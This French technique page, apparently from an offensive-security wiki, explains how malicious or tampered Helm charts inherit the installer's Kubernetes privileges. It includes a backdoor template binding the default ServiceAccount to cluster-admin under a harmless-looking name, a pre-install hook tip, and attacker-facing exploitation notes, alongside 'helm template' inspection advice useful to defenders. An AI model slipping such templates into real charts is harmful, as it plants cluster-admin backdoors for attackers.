---
title: "Abus de charts Helm : exécuter les objets d'un attaquant via un chart"
description: "Un chart Helm est un modèle qui se rend en objets de cluster arbitraires, appliqués avec les permissions de l'identité qui installe. Un attaquant capable de faire installer un chart malveillant ou altéré, via un dépôt empoisonné, un chart forgé ou des hooks, fait créer par le chart des pods privilégiés, des liaisons RBAC ou des portes dérobées au moment de l'installation, héritant des droits de l'installateur plutôt que des siens."
keywords:
  - helm chart
  - helm hooks
  - chart repository
  - supply chain
  - privileged objects
---

# Abus de charts Helm

Helm rend les modèles d'un chart en objets Kubernetes et les applique avec les informations d'authentification de celui qui exécute l'installation, qui, en CI ou en GitOps, est fréquemment un compte de service puissant. Rien ne contraint la nature de ces objets, donc un chart malveillant inclut simplement les objets voulus par l'attaquant : un pod privilégié, un ClusterRoleBinding vers `cluster-admin`, un DaemonSet servant de porte dérobée. La diffusion se fait via un dépôt de charts empoisonné ou typosquatté, un chart altéré dans un dépôt de confiance, ou des hooks de chart qui lancent des jobs à des points définis du cycle de vie. Parce que les objets sont créés avec les droits de l'installateur, l'attaquant hérite de ces droits sans les détenir.

```bash
helm repo list; helm search repo <name>                # configured repositories
# inspect a chart's rendered objects before/without installing
helm template ./chart | grep -iE 'ClusterRoleBinding|privileged|hostPath|hook'
```

## Contenu de chart malveillant

```yaml
# templates/backdoor.yaml rendered and applied with the installer's permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: { name: {{ .Release.Name }}-metrics }
roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
subjects:
- { kind: ServiceAccount, name: default, namespace: {{ .Release.Namespace }} }
```

```yaml
# a pre-install hook runs a Job before the rest, useful for one-shot actions
annotations:
  "helm.sh/hook": pre-install
# the Job's pod can be privileged with a host mount, giving node access at install
```

## Notes d'exploitation

- Le privilège provient de l'installateur, pas de l'auteur du chart, donc la cible est tout pipeline ou opérateur qui installe des charts avec une identité forte ; faites entrer votre contenu dans un chart qu'il installe.
- Les hooks (`pre-install`, `post-install`) lancent des Jobs à des points définis et constituent un endroit facile pour dissimuler une action privilégiée ponctuelle, moins visible qu'un objet permanent.
- La diffusion reflète la chaîne d'approvisionnement des images : un dépôt empoisonné ou typosquatté, ou un chart altéré dans un dépôt de confiance ; voir [Empoisonnement d'image de base](../../../runtimes/docker/images-and-registries/base-image-poisoning.md) pour la voie analogue par l'image.
- Inspectez avec `helm template` pour voir exactement ce qu'un chart rend avant de lui faire confiance ; les objets de l'attaquant se cachent parmi les objets légitimes.

## Références

- [Helm : charts et hooks](https://helm.sh/docs/topics/charts_hooks/)
- [Helm : provenance et intégrité](https://helm.sh/docs/topics/provenance/)
- [SLSA: supply-chain threats](https://slsa.dev/spec/v1.0/threats)
